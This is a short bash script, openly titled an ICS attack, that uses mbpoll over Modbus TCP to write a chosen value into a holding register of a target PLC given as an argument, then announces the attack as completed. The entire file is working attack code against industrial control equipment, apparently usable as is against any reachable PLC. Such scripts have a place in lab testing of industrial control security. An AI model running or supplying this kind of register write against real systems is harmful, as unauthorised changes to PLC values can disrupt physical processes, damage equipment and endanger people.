#!/usr/bin/env bash

TARGET_IP=$1

echo "==========================================="
echo "ICS ATTACK - MODBUS REGISTER MANIPULATION"
echo "==========================================="

echo "[INFO] Target PLC: $TARGET_IP"

if ! command -v mbpoll >/dev/null 2>&1; then
    echo "[ERROR] mbpoll not installed"
    exit 1
fi

echo "[INFO] Writing value to holding register"

mbpoll -m tcp -a 1 -r 1 -t 4:int -1 "$TARGET_IP" 123 | while read line
do
    echo "[MODBUS] $line"
done

echo "==========================================="
echo "MODBUS ATTACK COMPLETED"
echo "==========================================="